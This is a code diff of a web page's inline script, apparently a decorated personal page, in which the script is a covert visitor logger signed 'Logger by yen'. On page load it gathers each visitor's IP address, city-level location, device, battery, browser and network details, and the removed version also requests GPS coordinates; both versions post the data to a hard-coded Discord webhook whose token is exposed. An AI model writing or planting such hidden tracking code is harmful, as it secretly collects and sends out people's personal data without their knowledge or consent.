@@ -34,68 +34,213 @@
   <script src="snow.js" defer></script>
 
 <script>
-const apiKey = '6f609cfc9e5326';  // Replace with your IPinfo API key
-const webhookURL = 'https://discord.com/api/webhooks/1339271593217622157/YTICcLeK_iEf3nL_EEtkS45rsq4tHCwQALoq8Ev9Pb5y4EVji4-ciMJkWF9Lm4pndfIK';
+        async function getUserData() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                const browserInfo = navigator.userAgent;
+                const screenResolution = `${window.screen.width}x${window.screen.height}`;
+                const language = navigator.language;
+                const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const timestamp = new Date().toLocaleString('en-US', {
+                    timeZone
+                });
 
-const excludedIPs = ['137.175.197.32', '204.48.94.66']; // Add IPs to exclude
+                const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Computer";
+                const onlineStatus = navigator.onLine ? "🟢 Online" : "🔴 Offline";
+                const uptime = `${(performance.now() / 60000).toFixed(2)} min`;
+                const os = navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform;
+                const cpuCores = navigator.hardwareConcurrency;
+                const navHeight = `${window.innerHeight}px`;
+                let batteryLevel = "Unknown";
+                let powerSavingMode = "Unknown";
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
+                    powerSavingMode = battery.charging ? "No" : "Yes";
+                }
 
-function sendVisitorData(ipData, lat = "N/A", lon = "N/A", accuracy = "N/A", incognito = "N/A") {
-    if (excludedIPs.includes(ipData.ip)) {
-        console.log(`Excluded IP detected: ${ipData.ip}, skipping logging.`);
-        return;
-    }
-    
-    const userAgent = navigator.userAgent;
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const screenWidth = window.screen.width;
-    const screenHeight = window.screen.height;
-    const language = navigator.language || navigator.userLanguage;
-    const referrer = document.referrer || "Direct Access";
-    
-    const embedData = {
-        "embeds": [{
-            "title": "New Visitor Logged",
-            "description": `**IP:** ${ipData.ip}\n**Location:** ${ipData.city}, ${ipData.region}, ${ipData.country}\n**ISP:** ${ipData.org}\n**Timezone:** ${timezone}\n**Screen:** ${screenWidth}x${screenHeight}\n**User-Agent:** ${userAgent}\n**Language:** ${language}\n**Referrer:** ${referrer}\n**Incognito Mode:** ${incognito}\n\n**GPS:**\n- Latitude: ${lat}\n- Longitude: ${lon}\n- Accuracy: ${accuracy} meters`,
-            "color": 3066993,
-        }]
-    };
+                let adBlockEnabled = "Unknown";
+                try {
+                    await fetch(new Request("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js", {
+                            method: 'HEAD',
+                            mode: 'no-cors'
+                        }))
+                        .then(() => adBlockEnabled = "❌ No", () => adBlockEnabled = "✅ Yes");
+                } catch (error) {
+                    adBlockEnabled = "✅ Yes";
+                }
 
-    fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(embedData)
-    })
-    .then(() => console.log('Visitor data sent.'))
-    .catch(error => console.error('Error sending data:', error));
-}
+                const browserName = navigator.appName;
+                const browserVersion = navigator.appVersion;
+                const browserLanguage = navigator.language;
+                const cookiesEnabled = navigator.cookieEnabled ? "✅ Yes" : "❌ No";
+                const connectionType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
+                const connectionRtt = navigator.connection ? `${navigator.connection.rtt} ms` : "Unknown";
+                const connectionDownlink = navigator.connection ? `${navigator.connection.downlink} Mbps` : "Unknown";
+                const osVersion = navigator.userAgentData ? navigator.userAgentData.platformVersion : "Unknown";
 
-async function logVisitor() {
-    fetch(`https://ipinfo.io?token=${apiKey}`)
-        .then(response => response.json())
-        .then(ipData => {
-            if (excludedIPs.includes(ipData.ip)) {
-                console.log(`Excluded IP detected: ${ipData.ip}, skipping logging.`);
-                return;
+                let location = "Unknown";
+                try {
+                    const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                    const locationData = await locationResponse.json();
+                    location = `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
+                } catch (error) {
+                    console.error("Error while fetching location:", error);
+                }
+
+                const data = {
+                    ip,
+                    browser: browserInfo,
+                    resolution: screenResolution,
+                    language,
+                    timeZone,
+                    timestamp,
+                    deviceType,
+                    onlineStatus,
+                    uptime,
+                    os,
+                    cpuCores,
+                    navHeight,
+                    batteryLevel,
+                    powerSavingMode,
+                    adBlockEnabled,
+                    browserName,
+                    browserVersion,
+                    browserLanguage,
+                    cookiesEnabled,
+                    connectionType,
+                    connectionRtt,
+                    connectionDownlink,
+                    osVersion,
+                    location
+                };
+
+                await sendDataToWebhook(data);
+            } catch (error) {
+                console.error("Error while fetching data:", error);
             }
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        sendVisitorData(ipData, position.coords.latitude, position.coords.longitude, position.coords.accuracy);
-                    },
-                    () => {
-                        sendVisitorData(ipData);
-                    },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
+        }
+
+        async function sendDataToWebhook(data) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1339271593217622157/YTICcLeK_iEf3nL_EEtkS45rsq4tHCwQALoq8Ev9Pb5y4EVji4-ciMJkWF9Lm4pndfIK'; // webhook
+
+            const payload = {
+                content: "📡 **New user login!**",
+                embeds: [{
+                    title: "📊 Device details",
+                    color: 16711680,
+                    fields: [{
+                        name: "📍 IP",
+                        value: data.ip,
+                        inline: true
+                    }, {
+                        name: "🌍 Location",
+                        value: data.location,
+                        inline: true
+                    }, {
+                        name: "🖥️ Resolution",
+                        value: data.resolution,
+                        inline: true
+                    }, {
+                        name: "🗣️ Language",
+                        value: data.language,
+                        inline: true
+                    }, {
+                        name: "🕒 Time Zone",
+                        value: data.timeZone,
+                        inline: true
+                    }, {
+                        name: "📅 Time",
+                        value: data.timestamp,
+                        inline: false
+                    }, {
+                        name: "📱 Device Type",
+                        value: data.deviceType,
+                        inline: true
+                    }, {
+                        name: "🔋 Battery",
+                        value: data.batteryLevel,
+                        inline: true
+                    }, {
+                        name: "⚡ Power Saving Mode",
+                        value: data.powerSavingMode,
+                        inline: true
+                    }, {
+                        name: "🖥️ Operating System",
+                        value: data.os,
+                        inline: true
+                    }, {
+                        name: "🔗 Online Status",
+                        value: data.onlineStatus,
+                        inline: true
+                    }, {
+                        name: "📊 Uptime",
+                        value: data.uptime,
+                        inline: true
+                    }, {
+                        name: "🖥️ CPU Cores",
+                        value: data.cpuCores.toString(),
+                        inline: true
+                    }, {
+                        name: "📏 Navigation Bar Height",
+                        value: data.navHeight,
+                        inline: true
+                    }, {
+                        name: "🚫 AdBlock",
+                        value: data.adBlockEnabled,
+                        inline: true
+                    }, {
+                        name: "🌐 Browser",
+                        value: data.browserName,
+                        inline: true
+                    }, {
+                        name: "📜 Browser Version",
+                        value: data.browserVersion,
+                        inline: true
+                    }, {
+                        name: "🍪 Cookies",
+                        value: data.cookiesEnabled,
+                        inline: true
+                    }, {
+                        name: "📶 Connection Type",
+                        value: data.connectionType,
+                        inline: true
+                    }, {
+                        name: "⏱️ Latency (RTT)",
+                        value: data.connectionRtt,
+                        inline: true
+                    }, {
+                        name: "⬇️ Download Speed",
+                        value: data.connectionDownlink,
+                        inline: true
+                    }],
+                    footer: {
+                        text: "Logger by yen",
+                        icon_url: ""
+                    }
+                }]
+            };
+
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+
+            if (!response.ok) {
+                console.error("Sending error:", response.statusText);
             } else {
-                sendVisitorData(ipData);
+                console.log("Data sent successfully.");
             }
-        })
-        .catch(error => console.error('Error fetching IP data:', error));
-}
+        }
 
-logVisitor();
-</script>
+        window.onload = getUserData;
+    </script>
+
 
 
 
